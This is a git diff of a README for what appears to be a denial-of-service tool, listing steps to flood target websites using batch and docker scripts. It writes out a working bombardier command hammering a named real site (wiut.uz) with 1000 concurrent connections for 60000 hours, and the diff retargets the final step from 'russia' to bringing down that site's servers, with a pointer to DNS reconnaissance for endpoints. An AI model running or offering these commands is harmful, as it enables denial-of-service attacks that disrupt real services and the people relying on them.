@@ -35,6 +35,6 @@ The easiest way
 6. run all aims from resources.txt for winodws - `run_windows.bat` for Linux/Mac `./run_all_docker.sh ` for resources.txt  or ( .`/run_all_docker.sh your_aim_file`)
 7. If you want select aims mainally . `docker run -d --rm alpine/bombardier -c 1000 -d 60000h -l https://wiut.uz` Open as many separate CMD consoles as many scripts you are going to launch (each line – one script)
 8. Make sure that the process started
-9. Wait till russia fall
+9. Wait till wiut servers' fall
 
 > All endpoints can be found at: https://dnsdumpster.com
